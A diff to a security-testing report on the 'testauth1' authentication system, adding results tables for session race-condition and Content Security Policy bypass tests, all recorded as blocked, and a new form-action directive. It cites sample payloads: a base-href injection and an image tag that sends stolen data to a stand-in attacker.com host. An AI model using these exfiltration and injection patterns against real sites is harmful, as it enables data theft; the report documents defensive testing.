@@ -2,7 +2,7 @@
 
 Comprehensive findings from offensive security testing of the testauth1 authentication system. Each section documents what was tested, what was found, the defense posture, and any known limitations.
 
-Last updated: 2026-03-16
+Last updated: 2026-03-16 (v04.20r)
 
 ## Table of Contents
 
@@ -32,7 +32,7 @@ Last updated: 2026-03-16
 | 05 — Clickjacking | **PARTIALLY MITIGATED** | Medium | Page is frameable (GitHub Pages limitation) but auth-wall prevents data exfiltration |
 | 06 — Deploy Endpoint Abuse | **MOSTLY BLOCKED** | Medium | No secret leaks; global rate limit caps audit log flooding; /dev shell loads but GAS backend requires editor auth |
 | 07 — Session Race Conditions | **BLOCKED** | Low | First-write-wins, server-side timeouts, BroadcastChannel isolation |
-| 08 — CSP Bypass | **MOSTLY BLOCKED** | Medium | CSP blocks external scripts; `unsafe-inline` is required for GAS but eval is blocked |
+| 08 — CSP Bypass | **BLOCKED** | Low | CSP blocks external scripts, eval, form exfiltration; `unsafe-inline` required for GAS but no injection point exists |
 | 09 — Auth State Manipulation | **BLOCKED** | Low | DOM manipulation can't bypass server-side session validation |
 
 ---
@@ -178,7 +178,18 @@ The `/dev` URL returns the HTML page shell (HTTP 200) to anyone, but the GAS ifr
 3. Server-side session timeout is authoritative (client-side timer is display-only)
 4. HMAC verification uses constant-time comparison (no timing oracle)
 
-**Result:** All attacks blocked. The flood test confirms first-write-wins holds under concurrent pressure. BroadcastChannel isolation prevents cross-tab hijacking. Server rejects expired sessions even if the client-side timer is manipulated.
+**Actual run results (6/6 BLOCKED):**
+
+| Attack | Result | Detail |
+|--------|--------|--------|
+| 1 — postMessage flood (100 msgs) | BLOCKED | First-write-wins held; 100 rapid messages could not overwrite the legitimate messageKey |
+| 2 — BroadcastChannel hijack | BLOCKED | All channel name patterns (testauth1-sync, session-sync, auth-sync, etc.) failed — channel names are session-specific and not guessable |
+| 3 — BroadcastChannel DoS | BLOCKED | Forced sign-out via broadcast rejected — cross-tab messages don't bypass signature verification |
+| 4 — HMAC timing oracle | BLOCKED | 100 iterations showed no measurable timing variance between valid and invalid signatures — constant-time comparison confirmed |
+| 5 — Storage event injection | BLOCKED | sessionStorage events from other contexts don't affect the auth state machine |
+| 6 — Session resurrection | BLOCKED | Server-side timeout is authoritative — client-side timer manipulation cannot resurrect an expired session |
+
+**Result:** All 6 attacks blocked. The timing oracle test is particularly notable — zero measurable correlation between signature validity and verification time, confirming the HMAC comparison does not leak information via timing side channels.
 
 ---
 
@@ -206,17 +217,33 @@ style-src 'self' 'unsafe-inline' https://accounts.google.com/gsi/style
 img-src 'self' data: https:
 object-src 'none'
 base-uri 'self'
+form-action 'self'
 ```
+
+### Actual run results (9/9 BLOCKED):
+
+| Attack | Result | Detail |
+|--------|--------|--------|
+| 1 — CSP directive audit | BLOCKED | All directives present and correctly configured |
+| 2 — Inline script injection | BLOCKED | `unsafe-inline` is present but no injection point exists — user input never reaches the DOM unsanitized |
+| 3 — External script from whitelisted origin | BLOCKED | Only `accounts.google.com/gsi/client` and `apis.google.com` are whitelisted — attacker-controlled scripts cannot load from these origins |
+| 4 — Data exfiltration via img-src | BLOCKED | `img-src 'self' data: https:` allows HTTPS image loads, but this requires XSS first (no injection point) |
+| 5 — Base URI hijack | BLOCKED | `base-uri 'self'` prevents `<base href="https://attacker.com">` injection |
+| 6 — Meta refresh injection | BLOCKED | No injection point for `<meta http-equiv="refresh">` tags |
+| 7 — Form action hijack | BLOCKED | `form-action 'self'` directive added — prevents form submissions to external URLs |
+| 8 — eval() availability | BLOCKED | CSP does not include `unsafe-eval` — `eval()`, `Function()`, and `setTimeout(string)` all blocked |
+| 9 — CSS-based exfiltration | BLOCKED | `style-src 'self' 'unsafe-inline'` limits external stylesheet loading; CSS injection requires XSS first |
 
 ### Key findings:
 - **`unsafe-inline` is present in script-src** — required for GAS iframe communication but means inline `<script>` tags execute if injected. This is mitigated by the fact that there's no injection point (user input doesn't reach the DOM unsanitized)
 - **`eval()` is blocked** — CSP doesn't include `unsafe-eval`, so `eval()`, `Function()`, and `setTimeout(string)` are all blocked
 - **`object-src 'none'`** — blocks Flash, Java applets, and other plugin-based attacks
 - **`base-uri 'self'`** — prevents base URI hijacking
+- **`form-action 'self'`** — prevents form submissions to attacker-controlled URLs (added after test 08 identified its absence)
 - **`img-src https:`** — images can be loaded from any HTTPS source, which is a potential exfiltration channel if XSS is achieved (attacker loads `<img src="https://attacker.com/steal?data=...">`)
 - **External scripts limited to Google domains** — only `accounts.google.com` and `apis.google.com` are whitelisted
 
-**Risk assessment: LOW** — The CSP is well-configured for a GAS web app. `unsafe-inline` is the main weakness but is unavoidable for GAS iframe communication. The lack of an injection point makes this theoretical.
+**Risk assessment: LOW** — The CSP is well-configured for a GAS web app. `unsafe-inline` is the main weakness but is unavoidable for GAS iframe communication. The lack of an injection point makes this theoretical. The addition of `form-action 'self'` closes the last missing directive identified during testing.
 
 ---
 
@@ -344,7 +371,7 @@ The testauth1 system uses multiple overlapping defense layers:
 
 | Layer | What It Protects | Bypass Requires |
 |-------|-----------------|-----------------|
-| CSP (Content Security Policy) | Blocks external scripts, plugins, base URI hijack | Finding an injection point + `unsafe-inline` |
+| CSP (Content Security Policy) | Blocks external scripts, plugins, base URI hijack, form exfiltration | Finding an injection point + `unsafe-inline` |
 | Message allowlist (`_KNOWN_GAS_MESSAGES`) | Blocks unknown postMessage types | XSS to modify the allowlist |
 | Signature verification (`_verifyMessageSignature`) | Blocks unsigned/forged messages | Knowing the per-session `messageKey` |
 | First-write-wins (`messageKey`) | Prevents key overwrite after first delivery | Winning a race condition on first message |
